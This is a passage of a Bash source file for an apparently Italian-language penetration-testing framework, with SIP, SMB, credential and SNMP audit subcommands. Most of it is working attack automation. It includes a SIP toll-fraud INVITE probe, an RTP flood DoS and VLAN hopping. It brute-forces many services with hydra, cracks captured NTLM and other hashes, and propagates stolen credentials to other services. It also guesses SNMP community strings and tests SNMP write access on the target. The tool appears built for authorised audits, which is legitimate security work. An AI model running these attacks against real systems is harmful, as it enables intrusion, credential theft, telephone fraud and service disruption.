        tf_resp=$(printf '%b' "$toll_invite" | nc -u -w 3 "$target" "$port" 2>/dev/null | head -1 || true)
        echo "Toll fraud INVITE → $tf_resp" >> "$OUTDIR/sip_methods.txt"
        # 100 Trying / 180 Ringing → gateway prova a instradare → toll fraud possibile
        if echo "$tf_resp" | grep -qE "^SIP/2.0 (100|180|183|200)"; then
            found CRITICAL "SIP:$port — TOLL FRAUD possibile: gateway ha accettato INVITE verso PSTN esterno (${tf_resp})"
        elif echo "$tf_resp" | grep -q "^SIP/2.0 40[17]"; then
            found MEDIUM "SIP:$port — gateway richiede auth per chiamate esterne (${tf_resp}) — brute force applicabile"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SIP toll fraud probe (INVITE PSTN) → $target:$port"
    fi

    local sip_script="$EXA_SCRIPTS_DIR/python/sip_enum.py"
    if [[ -f "$sip_script" ]]; then
        section "SIP User Enumeration (sip_enum.py)"
        run_cmd "sip_enum_py" "python3 \"$sip_script\" $target --port $port --range ${ext_range:-100-500} --transport udp 2>&1 | tee \"$OUTDIR\"/sip_enum_py.txt"
    fi

    # ── sippts — SIP pentest suite ────────────────────────────
    section "SIP Pentest Suite (sippts)"
    if command -v sippts &>/dev/null; then
        run_cmd "sippts_scan" \
            "sippts scan -i $target -fp -o '$OUTDIR/sippts_scan.txt' 2>&1 | tee '$OUTDIR/sippts_scan_log.txt' || true"
        run_cmd "sippts_enum" \
            "sippts enum -i $target -p $port -e ${ext_range:-100-300} \
             -o '$OUTDIR/sippts_enum.txt' 2>&1 | tee '$OUTDIR/sippts_enum_log.txt' || true"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sippts_enum.txt" ]]; then
            grep -c "found\|200 OK\|register" "$OUTDIR/sippts_enum.txt" 2>/dev/null | \
                { read n; [[ ${n:-0} -gt 0 ]] && \
                    found HIGH "SIP — sippts: $n extension trovati (vedi $OUTDIR/sippts_enum.txt)"; } || true
        fi
        # sippts crack se wordlist disponibile
        local wl; wl="${wordlist:-$(_wl_pass)}"
        if [[ -s "$OUTDIR/sippts_enum.txt" ]]; then
            run_cmd "sippts_crack" \
                "sippts crack -i $target -p $port \
                 -w '$wl' -o '$OUTDIR/sippts_crack.txt' \
                 2>&1 | tee '$OUTDIR/sippts_crack_log.txt' || true"
            if [[ $DRY_RUN -eq 0 && -s "$OUTDIR/sippts_crack.txt" ]]; then
                grep -iE "password|cracked|found" "$OUTDIR/sippts_crack.txt" 2>/dev/null | \
                    while IFS= read -r line; do found HIGH "SIP CRACK (sippts) — $line"; done || true
            fi
        fi
    else
        warn "sippts non trovato — installa: pip3 install sippts"
    fi

    # ── rtpflood — RTP DoS test ───────────────────────────────
    section "RTP Flood DoS Test (rtpflood)"
    if command -v rtpflood &>/dev/null; then
        # RTP usa porte effimere, tipicamente 10000-20000
        local rtp_port=10000
        log "  rtpflood su $target:$rtp_port (100 pacchetti)"
        if [[ $DRY_RUN -eq 0 ]]; then
            run_cmd "rtpflood" \
                "timeout 10 rtpflood $target $rtp_port 100 \
                 2>&1 | tee '$OUTDIR/rtpflood.txt' || true"
            [[ -s "$OUTDIR/rtpflood.txt" ]] && \
                found MEDIUM "SIP/RTP — rtpflood: $target:$rtp_port risponde (DoS test applicabile)"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} rtpflood $target $rtp_port 100"
        fi
    else
        warn "rtpflood non trovato — test RTP DoS saltato"
    fi

    # ── voiphopper — VLAN hopping VoIP ───────────────────────
    section "VoIP VLAN Hopping (voiphopper)"
    if command -v voiphopper &>/dev/null; then
        local _viface; _viface=$(ip route get "$target" 2>/dev/null | \
            awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1 || echo "eth0")
        if [[ $DRY_RUN -eq 0 ]]; then
            log "  voiphopper CDP sniff su $_viface (10s)"
            run_cmd "voiphopper_cdp" \
                "timeout 10 voiphopper -i '$_viface' -c 0 \
                 2>&1 | tee '$OUTDIR/voiphopper_cdp.txt' || true"
            if [[ -s "$OUTDIR/voiphopper_cdp.txt" ]]; then
                grep -qiE "VLAN|CDP|voice" "$OUTDIR/voiphopper_cdp.txt" 2>/dev/null && \
                    found HIGH "VoIP — VLAN hopping possibile: CDP/voice VLAN rilevata (voiphopper)"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} voiphopper -i $_viface -c 0  (CDP sniff)"
            echo -e "${CYAN}[DRY-RUN]${NC} voiphopper -i $_viface -a    (auto VLAN hop)"
        fi
    else
        warn "voiphopper non trovato — VLAN hopping test saltato"
    fi

    ok "SIP audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: smb
# ============================================================
usage_smb() {
    echo "Uso: exa-dune smb <TARGET> [OPTIONS]"
    echo ""
    echo "  SMB/NetBIOS enumeration, signing check, GPP password, named pipes"
    echo "  Wraps: nmap smb NSE, enum4linux, smbclient, hydra, impacket"
    echo ""
    echo "Opzioni:"
    echo "  --no-bruteforce    Salta hydra SMB brute force"
    echo "  --threads N        Thread hydra (default: 4)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_smb() {
    local target="" do_brute=1 threads=4
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --no-bruteforce) do_brute=0;          shift ;;
            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)       DRY_RUN=1;           shift ;;
            --help|-h)       usage_smb; exit 0 ;;
            -*)              err "Opzione sconosciuta: $1"; usage_smb; exit 1 ;;
            *)               target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_smb; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "smb"
    log "Target: $target | Output: $OUTDIR"

    section "Nmap SMB NSE Scripts"
    run_cmd "nmap_smb" \
        "nmap -p 139,445 \
         --script smb-vuln*,smb-enum-users,smb-enum-shares,smb-os-discovery,smb-security-mode \
         -oN \"$OUTDIR\"/nmap_smb.txt $target 2>&1"

    section "NBTStat Info"
    run_cmd "nbtstat" "nmap -p 137 --script nbstat $target -oN \"$OUTDIR\"/nbtstat.txt 2>&1"

    section "enum4linux"
    if require_tool enum4linux; then
        run_cmd "enum4linux" "enum4linux -a $target 2>&1 | tee \"$OUTDIR\"/enum4linux.txt"
    fi

    section "Null Session (smbclient)"
    if require_tool smbclient; then
        run_cmd "smb_null" "smbclient -L '//$target' -N 2>&1 | tee \"$OUTDIR\"/smb_null.txt"
    fi

    section "SMB Signing Check"
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_smb.txt" ]]; then
        if grep -qiE "message_signing.*disabled|signing.*not required|signing.*false" \
           "$OUTDIR/nmap_smb.txt" 2>/dev/null; then
            found HIGH "SMB:445 — SMB signing DISABILITATO: credential relay possibile (Responder/ntlmrelayx)"
        elif grep -qiE "message_signing.*enabled.*not required" "$OUTDIR/nmap_smb.txt" 2>/dev/null; then
            found MEDIUM "SMB:445 — SMB signing enabled ma non richiesto (relay ancora possibile)"
        fi
    else
        run_cmd "nmap_smb_signing" \
            "nmap -p 445 --script smb-security-mode \
             -oN \"$OUTDIR\"/nmap_smb_signing.txt $target 2>&1"
    fi

    section "EternalBlue MS17-010 + SMBGhost CVE-2020-0796"
    run_cmd "nmap_eternalblue" \
        "nmap -p 445 --script smb-vuln-ms17-010 \
         -oN \"$OUTDIR\"/nmap_ms17010.txt $target 2>&1"
    run_cmd "nmap_smbghost" \
        "nmap -p 445 --script smb-vuln-cve-2020-0796 \
         -oN \"$OUTDIR\"/nmap_smbghost.txt 2>/dev/null $target 2>&1 || \
         nmap -p 445 --script safe \
         -oN \"$OUTDIR\"/nmap_smbghost.txt $target 2>&1"
    if [[ $DRY_RUN -eq 0 ]]; then
        grep -qiE "VULNERABLE|MS17-010" "$OUTDIR/nmap_ms17010.txt" 2>/dev/null && \
            found CRITICAL "SMB:445 — EternalBlue MS17-010 VULNERABILE"
        grep -qiE "VULNERABLE|CVE-2020-0796" "$OUTDIR/nmap_smbghost.txt" 2>/dev/null && \
            found CRITICAL "SMB:445 — SMBGhost CVE-2020-0796 VULNERABILE"
    fi

    section "Shadow Copy + SYSVOL/NETLOGON Enumeration"
    if [[ $DRY_RUN -eq 0 ]] && require_tool smbclient; then
        for share in "SYSVOL" "NETLOGON" "ADMIN\$" "C\$"; do
            local share_list
            share_list=$(smbclient "//${target}/${share}" -N -c "ls" 2>&1 || true)
            if echo "$share_list" | grep -qiE "blocks|listing|NT_STATUS_OK"; then
                found MEDIUM "SMB — share accessibile anonimamente: ${share}"
                echo "$share_list" >> "$OUTDIR/smb_share_${share//\$/dollar}.txt"
                # GPP Password in SYSVOL
                if [[ "$share" == "SYSVOL" ]]; then
                    local gpp_search
                    gpp_search=$(smbclient "//${target}/SYSVOL" -N \
                        -c "recurse; ls" 2>/dev/null | grep -i "Groups.xml" | head -5 || true)
                    if [[ -n "$gpp_search" ]]; then
                        found CRITICAL "SMB SYSVOL — Groups.xml trovato (GPP Password MS14-025 possibile)"
                        echo "$gpp_search" >> "$OUTDIR/smb_gpp_groups.txt"
                    fi
                fi
            fi
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SMB SYSVOL/NETLOGON enum $target"
    fi

    section "Named Pipe Enumeration"
    if [[ $DRY_RUN -eq 0 ]] && tool_ok rpcclient; then
        run_cmd "named_pipes" \
            "rpcclient -N -U '' $target -c 'srvinfo' 2>&1 | tee \"$OUTDIR\"/smb_pipes.txt || true"
        run_cmd "named_pipes2" \
            "nmap -p 445 --script smb-enum-pipes $target \
             -oN \"$OUTDIR\"/nmap_smb_pipes.txt 2>&1 || true"
        if [[ -s "$OUTDIR/nmap_smb_pipes.txt" ]]; then
            grep -c "\\\\pipe\\\\" "$OUTDIR/nmap_smb_pipes.txt" 2>/dev/null | \
                { read n; [[ ${n:-0} -gt 0 ]] && found MEDIUM "SMB — $n named pipes accessibili"; } || true
        fi
    fi

    section "SMB Share Write Permission Test"
    if [[ $DRY_RUN -eq 0 ]] && require_tool smbclient; then
        for share in "IPC\$" "C\$" "ADMIN\$" "Users" "share" "public" "data"; do
            local write_test
            write_test=$(smbclient "//${target}/${share}" -N \
                -c "put /dev/null .exa_write_test" 2>&1 || true)
            if echo "$write_test" | grep -qiE "NT_STATUS_OK|putting file"; then
                found CRITICAL "SMB — scrittura anonima su share: ${share}"
                smbclient "//${target}/${share}" -N \
                    -c "del .exa_write_test" 2>/dev/null || true
            fi
        done
        # RID cycling user enumeration
        if tool_ok rpcclient; then
            run_cmd "rid_cycle" \
                "for rid in \$(seq 500 530); do \
                     rpcclient -N -U '' $target -c \"lookupnames guest\" 2>/dev/null | head -1; \
                     rpcclient -N -U '' $target -c \"lookupsids S-1-5-21-\$rid\" 2>/dev/null; \
                 done | grep -v 'NT_STATUS' | tee \"$OUTDIR\"/rid_cycle.txt"
        fi
    fi

    if [[ $do_brute -eq 1 ]]; then
        section "SMB Brute Force (hydra)"
        if require_tool hydra; then
            local ul; ul=$(_wl_users)
            local pl; pl=$(_wl_pass)
            run_cmd "hydra_smb" \
                "hydra -L \"$ul\" -P \"$pl\" -t $threads -f -w 4 -W 2 \
                 -o \"$OUTDIR/hydra_smb.txt\" $target smb 2>&1 | tee -a \"$OUTDIR/smb_audit.log\""
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_smb.txt" ]]; then
                grep -i "login:" "$OUTDIR/hydra_smb.txt" 2>/dev/null \
                    | while IFS= read -r line; do
                        found HIGH "SMB — $line"
                        local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
                        local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
                        [[ -n "$hu" && -n "$hp" ]] && \
                            _cred_store_add smb "$target" 445 "$hu" "$hp" "smb:hydra"
                      done || true
            fi
        fi
    fi

    # ── netexec (nxc) — SMB enum avanzato ────────────────────
    section "netexec (nxc) SMB Enumeration"
    if command -v nxc &>/dev/null || command -v netexec &>/dev/null; then
        local _nxc_bin="nxc"; command -v nxc &>/dev/null || _nxc_bin="netexec"
        run_cmd "nxc_smb_info" \
            "$_nxc_bin smb $target 2>&1 | tee '$OUTDIR/nxc_smb_info.txt'"
        run_cmd "nxc_shares" \
            "$_nxc_bin smb $target --shares 2>&1 | tee '$OUTDIR/nxc_shares.txt' || true"
        run_cmd "nxc_users" \
            "$_nxc_bin smb $target --users 2>&1 | tee '$OUTDIR/nxc_users.txt' || true"
        if [[ $DRY_RUN -eq 0 ]]; then
            if [[ -f "$OUTDIR/nxc_smb_info.txt" ]]; then
                grep -qiE "signing:False\|signing: False" "$OUTDIR/nxc_smb_info.txt" 2>/dev/null && \
                    found HIGH "SMB — nxc: SMB signing disabilitato (relay attack possibile)"
                grep -qiE "\[\+\]" "$OUTDIR/nxc_shares.txt" 2>/dev/null && \
                    found MEDIUM "SMB — nxc: share accessibili trovati (vedi $OUTDIR/nxc_shares.txt)"
            fi
        fi
    else
        warn "netexec/nxc non trovato — installa: apt install netexec  o  pip3 install netexec"
    fi

    ok "SMB audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: creds
# ============================================================
usage_creds() {
    echo "Uso: exa-dune creds <TARGET> <SERVICE> [OPTIONS]"
    echo ""
    echo "  Credential brute force multiprotocollo"
    echo "  Wraps: hydra, curl (http basic)"
    echo ""
    echo "  SERVICE            ssh ftp telnet http https smb rdp vnc imap pop3 all"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (override default del servizio)"
    echo "  --path PATH        Path per http/https (default: /)"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --threads N        Thread hydra (default: 4)"
    echo "  --propagate        Propagazione credenziali trovate su altri servizi"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_creds() {
    local target="" service="" port="" path="/" threads=4 do_propagate=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --path)      _req_arg "$1" "${2:-}"; path="$2";        shift 2 ;;
            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
            --threads)   _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
            --propagate) do_propagate=1;   shift ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_creds; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_creds; exit 1 ;;
            *)
                if [[ -z "$target" ]]; then target="$1"
                elif [[ -z "$service" ]]; then service="$1"
                else err "Argomento inaspettato: $1"; usage_creds; exit 1; fi
                shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_creds; exit 1; }
    [[ -z "$service" ]] && { err "SERVICE mancante (ssh/ftp/telnet/http/https/smb/rdp/all)"; usage_creds; exit 1; }
    validate_target "$target"
    [[ -n "$port" ]] && validate_port "$port"
    setup_outdir "$target" "creds"
    log "Target: $target | Servizio: $service | Output: $OUTDIR"

    local ul; ul=$(_wl_users)
    local pl; pl=$(_wl_pass)

    _hydra() {
        local svc="$1" p="$2"
        local out="$OUTDIR/hydra_${svc}_${p}.txt"
        run_cmd "hydra_${svc}_${p}" \
            "hydra -L \"$ul\" -P \"$pl\" -s $p -t $threads -f -w 4 -W 2 \
             -o \"$out\" $target $svc 2>&1 | tee -a \"$OUTDIR/creds.log\""
        if [[ $DRY_RUN -eq 0 && -f "$out" ]]; then
            grep -i "login:" "$out" 2>/dev/null \
                | while IFS= read -r line; do
                    found HIGH "${svc^^}:${p} — $line"
                    local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
                    local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
                    [[ -n "$hu" && -n "$hp" ]] && \
                        _cred_store_add "$svc" "$target" "$p" "$hu" "$hp" "creds:hydra"
                  done || true
        fi
    }

    # Ritorna 0 se il target usa realmente HTTP Basic Auth (risponde 401 a credenziali fasulle)
    _http_requires_auth() {
        local scheme="$1" p="$2"
        local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
        local bogus_code
        bogus_code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
                     --user "__bogus_exa__:__bogus_exa__" --max-time 5 \
                     "${scheme}://${target}:${p}${path}" 2>/dev/null || echo "000")
        if [[ "$bogus_code" == "200" || "$bogus_code" == "302" ]]; then
            warn "  Falso positivo rilevato: ${scheme}://${target}:${p} risponde $bogus_code anche senza auth — test HTTP saltato"
            return 1
        fi
        return 0
    }

    _http_basic() {
        local scheme="$1" p="$2"
        local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} HTTP Basic auth test ${scheme}://${target}:${p}${path}"
            return
        fi
        # Anti-falso-positivo: salta se il target non usa HTTP Basic Auth
        _http_requires_auth "$scheme" "$p" || return 0
        local found_count=0
        while IFS= read -r user; do
            [[ -z "$user" ]] && continue
            while IFS= read -r pass; do
                [[ -z "$pass" ]] && continue
                local code
                code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
                       --user "${user}:${pass}" --max-time 5 \
                       "${scheme}://${target}:${p}${path}" 2>/dev/null)
                if [[ "$code" == "200" || "$code" == "302" ]]; then
                    found HIGH "HTTP Basic ${scheme}:${p} — ${user}:${pass} → HTTP $code"
                    ((found_count++)) || true
                fi
            done < "$pl"
        done < "$ul"
        [[ $found_count -eq 0 ]] && log "  Nessuna credenziale HTTP Basic trovata"
    }

    require_tool hydra || return 1

    case "$service" in
        ssh)    _hydra ssh   "${port:-22}" ;;
        ftp)    _hydra ftp   "${port:-21}" ;;
        telnet) _hydra telnet "${port:-23}" ;;
        smb)    _hydra smb   "${port:-445}" ;;
        rdp)    _hydra rdp   "${port:-3389}" ;;
        http)   _http_requires_auth http "${port:-80}" && _hydra http-get "${port:-80}" || true
                _http_basic http "${port:-80}" ;;
        https)  _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}" || true
                _http_basic https "${port:-443}" ;;
        vnc)    _hydra vnc   "${port:-5900}" ;;
        imap)   _hydra imap  "${port:-143}" ;;
        pop3)   _hydra pop3  "${port:-110}" ;;
        all)
            _hydra ssh    "${port:-22}"
            _hydra ftp    "${port:-21}"
            _hydra telnet "${port:-23}"
            _hydra smb    "${port:-445}"
            { _http_requires_auth http "${port:-80}"  && _hydra http-get  "${port:-80}"; } || true
            { _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}"; } || true
            _hydra vnc    "${port:-5900}"
            _hydra imap   "${port:-143}"
            _hydra pop3   "${port:-110}"
            ;;
        *) err "Servizio sconosciuto: $service (usa: ssh ftp telnet http https smb rdp vnc imap pop3 all)"; exit 1 ;;
    esac

    # Propagazione credenziali se richiesta
    if [[ $do_propagate -eq 1 ]]; then
        _cred_propagate "$target"
    fi
    _cred_store_summary

    # ── Hash cracking — hashcat/john (post brute-force) ──────
    section "Hash Crack (hashcat/john)"
    local _hash_files=()
    # Cerca hash file prodotti da moduli precedenti
    while IFS= read -r -d '' _hf; do
        _hash_files+=("$_hf")
    done < <(find "$OUTDIR_BASE" -name "*.hash" -o -name "*hashes*.txt" \
             -o -name "*ntlmv2*" -o -name "*ntlm*" 2>/dev/null -print0 || true)

    local _wl_crack; _wl_crack=$(_wl_pass)

    # Auto-detect tipo di hash e usa modalità corretta
    _crack_hashfile() {
        local _hf="$1"
        [[ ! -s "$_hf" ]] && return 0
        local _htype="0" _hname="MD5"
        local _sample; _sample=$(head -1 "$_hf" 2>/dev/null || true)
        # NTLMv2 (risponder format user::domain:...)
        echo "$_sample" | grep -qP '^[^:]+::[^:]+:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9a-fA-F]+$' && \
            { _htype="5600"; _hname="NTLMv2"; }
        # NTLM (32 hex chars)
        echo "$_sample" | grep -qP '^[0-9a-fA-F]{32}$' && { _htype="1000"; _hname="NTLM"; }
        # SHA1 (40 hex)
        echo "$_sample" | grep -qP '^[0-9a-fA-F]{40}$' && { _htype="100"; _hname="SHA1"; }
        # MD5crypt $1$
        echo "$_sample" | grep -qP '^\$1\$' && { _htype="500"; _hname="MD5crypt"; }
        # bcrypt $2y$
        echo "$_sample" | grep -qP '^\$2[aby]\$' && { _htype="3200"; _hname="bcrypt"; }
        log "  Crack $_hname ($_hf) con hashcat mode $_htype"
        if command -v hashcat &>/dev/null; then
            run_cmd "hashcat_${_hname}" \
                "hashcat -m $_htype '$_hf' '$_wl_crack' \
                 --outfile '${_hf%.txt}_cracked.txt' -O --status-timer 10 \
                 2>&1 | tail -10 || true"
            if [[ -s "${_hf%.txt}_cracked.txt" ]]; then
                while IFS= read -r _cline; do
                    found CRITICAL "HASH CRACKED ($_hname) — $_cline"
                done < "${_hf%.txt}_cracked.txt"
            fi
        elif command -v john &>/dev/null; then
            run_cmd "john_${_hname}" \
                "john --wordlist='$_wl_crack' '$_hf' 2>&1 | tee '${_hf%.txt}_john.log' || true"
            run_cmd "john_show_${_hname}" \
                "john --show '$_hf' 2>&1 | tee '${_hf%.txt}_john_cracked.txt'"
            if [[ -s "${_hf%.txt}_john_cracked.txt" ]]; then
                grep -v "^0 password" "${_hf%.txt}_john_cracked.txt" 2>/dev/null | \
                    while IFS= read -r _jline; do
                        found CRITICAL "HASH CRACKED john ($_hname) — $_jline"
                    done || true
            fi
        else
            warn "hashcat e john non trovati — installa: apt install hashcat john"
        fi
    }

    if [[ ${#_hash_files[@]} -gt 0 ]]; then
        for _hf in "${_hash_files[@]}"; do
            _crack_hashfile "$_hf"
        done
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} hashcat -m <mode> <hashfile> <wordlist>"
        echo -e "${CYAN}[DRY-RUN]${NC} john --wordlist=<wordlist> <hashfile>"
    else
        log "  Nessun file hash trovato — crack saltato"
    fi

    ok "Creds test completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: snmp
# ============================================================
usage_snmp() {
    echo "Uso: exa-dune snmp <TARGET> [OPTIONS]"
    echo ""
    echo "  SNMP audit — community string brute force + walk"
    echo "  Wraps: nmap snmp NSE, snmpwalk, snmpget"
    echo ""
    echo "Opzioni:"
    echo "  --communities FILE  File con community string (una per riga)"
    echo "  --version V         SNMP version: 1, 2c, 3 (default: prova 1 e 2c)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_snmp() {
    local target="" communities_file="" snmp_ver=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --communities)  _req_arg "$1" "${2:-}"; communities_file="$2"; shift 2 ;;
            --version)      _req_arg "$1" "${2:-}"; snmp_ver="$2";         shift 2 ;;
            --output)       _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";      shift 2 ;;
            --dry-run)      DRY_RUN=1;             shift ;;
            --help|-h)      usage_snmp; exit 0 ;;
            -*)             err "Opzione sconosciuta: $1"; usage_snmp; exit 1 ;;
            *)              target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_snmp; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "snmp"
    log "Target: $target | Output: $OUTDIR"

    section "Nmap SNMP Scan (UDP 161/162)"
    run_cmd "nmap_snmp" \
        "nmap -sU -p 161,162 \
         --script snmp-info,snmp-sysdescr,snmp-brute \
         -oN \"$OUTDIR\"/nmap_snmp.txt $target 2>&1"

    section "Community String Brute Force"
    local cfile
    if [[ -n "$communities_file" && -f "$communities_file" ]]; then
        cfile="$communities_file"
    else
        CUSTOM_COMM="" cfile=$(_wl_snmp)
    fi

    if require_tool snmpwalk; then
        if [[ $DRY_RUN -eq 0 ]]; then
            local found_comm=""
            while IFS= read -r community; do
                [[ -z "$community" ]] && continue
                for ver in v2c v1; do
                    local result
                    result=$(snmpwalk -"$ver" -c "$community" -t 2 -r 1 "$target" sysDescr 2>&1 | head -2)
                    if echo "$result" | grep -qiE "STRING:|INTEGER:|Timeticks:"; then
                        local summary; summary=$(echo "$result" | head -1 | tr -d '\n\r' | tr -s ' ')
                        found HIGH "SNMP community '$community' ($ver) → $summary"
                        found_comm="$community"
                        _cred_store_add snmp "$target" 161 "community" "$community" "snmp"
                        break 2
                    fi
                done
            done < "$cfile"

            if [[ -n "$found_comm" ]]; then
                section "SNMP Full Walk (community: $found_comm)"
                snmpwalk -v2c -c "$found_comm" "$target" 2>&1 | tee "$OUTDIR/snmp_walk_full.txt"
                snmpget -v2c -c "$found_comm" "$target" \
                    sysDescr.0 sysName.0 sysLocation.0 sysContact.0 sysUpTimeInstance 2>&1 \
                    | tee "$OUTDIR/snmp_sysinfo.txt"

                section "SNMP Extended OID Walk"
                # Interfacce di rete
                snmpwalk -v2c -c "$found_comm" "$target" ifDescr 2>&1 \
                    | tee "$OUTDIR/snmp_interfaces.txt"
                snmpwalk -v2c -c "$found_comm" "$target" ifAdminStatus 2>&1 \
                    | tee -a "$OUTDIR/snmp_interfaces.txt"
                snmpwalk -v2c -c "$found_comm" "$target" ipAdEntAddr 2>&1 \
                    | tee "$OUTDIR/snmp_ip_addresses.txt"
                # Routing table
                snmpwalk -v2c -c "$found_comm" "$target" ipRouteTable 2>&1 \
                    | tee "$OUTDIR/snmp_routes.txt"
                # Processi attivi (HR-MIB)
                snmpwalk -v2c -c "$found_comm" "$target" hrSWRunName 2>&1 \
                    | tee "$OUTDIR/snmp_processes.txt"
                # TCP connections
                snmpwalk -v2c -c "$found_comm" "$target" tcpConnState 2>&1 \
                    | tee "$OUTDIR/snmp_tcp_conn.txt"
                # Storage
                snmpwalk -v2c -c "$found_comm" "$target" hrStorageDescr 2>&1 \
                    | tee "$OUTDIR/snmp_storage.txt"
                # Utenti di sistema (se disponibile)
                snmpwalk -v2c -c "$found_comm" "$target" hrSWRunParameters 2>&1 \
                    | tee "$OUTDIR/snmp_sw_params.txt"
                # Software installato
                snmpwalk -v2c -c "$found_comm" "$target" hrSWInstalledName 2>&1 \
                    | tee "$OUTDIR/snmp_installed.txt"
                # Ricerca credenziali in processi/parametri
                grep -iE "pass|password|key|secret|token" \
                    "$OUTDIR/snmp_processes.txt" "$OUTDIR/snmp_sw_params.txt" 2>/dev/null | \
                    while IFS= read -r line; do found HIGH "SNMP — possibile credenziale in OID: $line"; done \
                    || warn "SNMP grep credenziali: nessun match o file non disponibile"

                section "SNMP Write Community Test (sysName.0)"
                if tool_ok snmpset; then
                    local orig_name
                    orig_name=$(snmpget -v2c -c "$found_comm" "$target" sysName.0 2>/dev/null \
                        | grep -oP 'STRING: \K.+' | head -1 || true)
                    if snmpset -v2c -c "$found_comm" -t 2 -r 1 "$target" \
                       sysName.0 s "exa-dune-write-test" 2>/dev/null; then
                        found CRITICAL "SNMP — WRITE access con community '$found_comm'"
                        # Ripristino
                        [[ -n "$orig_name" ]] && \
                            snmpset -v2c -c "$found_comm" -t 2 -r 1 "$target" \
                            sysName.0 s "$orig_name" 2>/dev/null || true
                    fi
                fi

                section "SNMP v3 Enumeration"
                if tool_ok snmpwalk; then
                    # Prova con credenziali comuni SNMPv3
                    local v3_creds=(
                        "admin:authpass:privpass" "admin:password:password"
                        "snmpuser:snmpuser:snmpuser" "root:rootpass:rootpass"
                    )
                    for v3c in "${v3_creds[@]}"; do
                        local v3u="${v3c%%:*}"
                        local v3rest="${v3c#*:}"; local v3ap="${v3rest%%:*}"; local v3pp="${v3rest#*:}"
                        local v3res
                        v3res=$(snmpwalk -v3 -l authPriv -u "$v3u" \
                            -a MD5 -A "$v3ap" -x DES -X "$v3pp" \
                            -t 2 -r 1 "$target" sysDescr 2>&1 | head -1 || true)
                        if echo "$v3res" | grep -qiE "STRING:|INTEGER:"; then
                            found HIGH "SNMP v3 — credenziali valide: ${v3u}:${v3ap}:${v3pp}"
                            break
                        fi
                    done
                fi
            else
                log "Nessuna community trovata — SNMP filtrato o community non standard"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SNMP community brute force su $target ($(wc -l < "$cfile" 2>/dev/null || echo 0) stringhe)"
        fi
    fi

    # cfile punta a seclists o a _FALLBACK_SNMP (cleanup via trap EXIT)
    ok "SNMP audit completato → $OUTDIR"
}

